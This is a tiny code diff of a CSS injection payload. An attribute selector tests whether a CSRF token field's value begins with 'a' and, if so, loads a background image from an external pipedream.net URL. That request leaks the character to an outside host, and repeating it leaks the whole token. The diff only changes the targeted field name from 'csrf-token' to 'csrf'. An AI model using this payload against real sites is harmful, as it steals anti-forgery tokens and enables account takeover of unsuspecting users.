@@ -1,3 +1,3 @@
-input[name="csrf-token"][value^="a"] + input {
+input[name="csrf"][value^="a"] + input {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?q=a)
 }
